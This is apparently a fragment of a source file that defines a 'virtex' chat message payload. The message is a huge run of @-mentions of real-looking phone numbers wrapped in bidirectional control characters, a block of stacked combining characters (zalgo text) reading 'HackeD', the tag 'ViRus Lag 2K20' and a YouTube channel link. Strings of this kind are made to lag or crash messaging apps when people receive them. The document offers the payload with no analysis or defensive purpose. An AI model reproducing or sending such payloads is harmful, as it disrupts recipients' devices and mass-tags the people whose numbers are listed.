524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩@⁨+1 (956) 524-4699⁩'
				pirtex5 = 'Ȟ̵̨̢̡̡̢̡̡̢̧̢̢̛̪̙̣͍̯͎͍̫̟̫͇̼̠̯̮͕̭̗̪̯̩͕̙̣̭̭̼͕̘̜͖͎̺̬͚̬̻̲̣͚͈̦̯͖̮̤͙̼̰̩͕̬̫̥͓̜͖̙̙̗̪̮͙̙̮̫̱̪̩̠̲̰̦̠̰̟̙̀̿̈́̋́̀̌͐͑̃̈̏̀̈́͑̎̑͂̌̆̆͗̔̿́̈́̉͊̒̔̀͂͋̐̒͂̓̎̓̇́̓́́̓̈́̓͌̈́̔̽̎͋̉̊̾̀͊̏͂̀͆̈́͌̑̽͘̕̕̕͜͜͜͜͝͝͝ͅa̵̡̨̛̛̛̛̛̛̛̛̛̫̘̺̠͚̞̤̹̩͔̯̠̣͍͚͕̩̲̭̼͈̠̫̲̱̹̫̥̘̭̩̱̰̥͎̮̘̙̤͔͎̤͖̙͇̪͌̑͌̎̈̔͊͒̈̈́̓̅̽̄͌͂̓͒̆̎́̍̐̐̔̏̎̈́̈́̎̈́́̓̆͂͛́͂̒̀̉̒̾͛͊͛̿̐̓͋̋̾͌̊͐͑͗̆̎͗̾͗͊̀͋̓̌͌͑͛̎͋̈́̾̈̓̓̿̔͗̿̂̽̆̌͂̽̀̉̊͑̋̉͒͌̂̋͛͆̉͑̊̾̀͛̈́̌͑́̆̎́́͊̿̿̄͗̓̈́̽̾̉̍͋̇̒̊̈́̓̑͌̾̉̿͊̽͊̒̍̇́́̑̃͗͂̅̆̋͑̍̽̑̍̽̋̇͊͑̀̉̈́̌́̓̓́̉̽̓͊̈̎̍͊̍͑̋̒͊̃̏̄̍̔̒̈́̈́̂̉̌̽͂̐̽̏̌̋̔̎͗̅͐̊̾̀̓́̈́̌̎̐̏̿̀̂̐̅̈͂̃̎̈̆͂̏̀̿́̀̓̌̐͛̏͐̇̎̎́͊͌͛̎̌̚͘͘̕̚̕̚̚͘̚͘̚͘͘̚̕͜͠͝͠͝͝͝͝͠͝͠͝͠͝ç̵̨̨̧̧̢̡̢̧̧̨̢̡̥̝͍̬͉̖̝͓̗̘̩͔̤̙̠̱̮͎̫̳̱̹̤̗̟̪̻̖̳̺̫̮̭͓̟͙̮̲͔͉͚̲͓̭͓̬̩͉̰̥̮̳̬͔͔̗̪̫͉͚͓̼͕͇̻͖̤̬̝̫͍͚̻̙̱̭̭̱͕̘̬͚̜̞̞̻͔̲̘̞̻͙̘͙͍̣̼͓̺̦͒̆͑̆̏̍́̾̓̌͒͗͗̀̄̐̒̒̐̀͗̃͌́̂͑̄̏̓̀̑̐̈́̂͒̈̔͑̏̈́̀̎̂̿̋͂͐̍̊̋͘̚͜͜͜͠͝͝͠͝͠͠ͅͅͅͅͅͅĶ̷̡̢̨̧̧̨̡̡̧̧̡̛̛̛̝̺̥͕̦̦̼̗̮͚̞͚̣̪̬̫̣͙̦̺̟̯̲͚̪̹͓̭̜̲̲̯̦̟̘̩̝̗̪̻̻̣̫̯͈͓̪̖̥̮̟͓̺̖͎͎̼̬͖̬͇̦̩̰̝̲̳̞̗̼͈̼̘̙̝͇̙̟̤͕̘̼̫̳̩̩̱͈̝̫̪͓̞͕͈͎͎̱͎͈͇̰̘̤͍̮͖̟̳̘̱͉̫̤͙̰̙̱͉̙̲̳̜̲̬̗͓̰̹̠͓͉̟̺̭͉̝͚̖͖̟̫͙͙̹͖̘̳̙̝̳̜̝͚̞̱̲̬̏̈̀̐̌̊̍͒̆͊̑̓̉͂̔̓̏͑̆̎́̐̿̐͊͛̋͋̓̐̔͋̆̄͌̿͑͒̈̽͑͒͛̒̉̽̋̑͊̓̏́̈́̀̒̈́͋͐̈́͒̉͐̋̽̿̽̃̽̔̃̇̒̇̿͋͐̑̂̇̑́̄̓͑̀̈́̈́͆͆̍̆͂̃͊̅͊̄͆̀̆̌̄͂̊̑̈́̆͑̀̇̂̕͘̚̕͘̕͘͜͜͜͜͜͝͠͝͝͝͝͠͠͝ͅͅͅͅȩ̴̧̛͖̟̹͎̲̙̗̦̝͍̖̤̮͍̼̣̫̹̦̱̥̠̦̘̞̳̩̗͇̗͔̘̦̠̦͓͈͖̙̖͖͍̬͉̘̮̲̞̻̘̞͎̣̮͓̼̪͚̙͔͓̭̼͍̥̤̥͈̻̻̮̮̩͈͈̣̫̤̘̜̥̤͎̩̤͕̄̐̄̎́͐̈́̔̾̈̆͗̄́͑̓̒̓͌̋̊́́̀̎͋̈́̀̋̏̉́̓͌̈̍̓͆͋̚̕̕̕͘͜͜͜͜͝͝͝͠͝D̶̨̧̢̢̧̢̨̡̢̛̛̛̛̛̛̛̲̤͓̫̙̝̻̤̜̤͎̥͔̩̹̟̲̱͍̥͓̮͖̠͔̩͇͓̙̬̯̙̹͚̜̗̳̪̙̩̯̱͓̺̗͉̗̰̫̻̬͙̥̟̠̻̩͔̩̥̩̪͉͓̜͎̻̭̦͓͓̜͓͈̫̝̤͎̞͕̭̤̟̻̂̓̊̏̓͐͆̽̒́̍̑̊̂͂̿̎̉̈́̉͐͆̇͆̒͂͗̄͒̂̈́͒̉͐̋́̃͋̍̾̈́͗̈́͒͗̇̔͂̀̐̀͛̏͐͂̄͐̀̿̀̆͆̈͆̒̇̾̍̀͗̉͐̀́͛̍́̈́̇͋̍̊̉̈́͊̓͊̈́̈͆̈́̓̍̌͋̈̇̒̏͗̈́͂͊͊͒͂̄̍̅̾̉͗̈́͌̽́̓́̓̈́̏͂͗̎̓͂̓̆̿͌̋͆͛̀͑̾̓̓̈̄̈́̈́̿̓̑̔̊͌̒̌̿̍̈́̂͆̈́͋̇̈́̾̐̒̍̒̈͆̉͗́̅̉̄͋̑̌͒̽̐̾̒̈̏̑̐̆͑̇̑̌̾͒̃̐̆͌̄͌͌̏̃̽̂̑̋̀̇̈̑͊͋͗̓̈́͆͊͌̆̓̒̇̍̇̇͛̌̉̈́̒́́̀̊̒̊́͆̕͘̕͘̕̚̕̚̕̚͘͘̕̚͘̕͘͘͜͜͠͝͠͝͠͝͝͠͝͠͠͝͝͝͠͝͝͝ͅͅ ViRus Lag 2K20 https://youtube.com/c/HYPERMOD *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 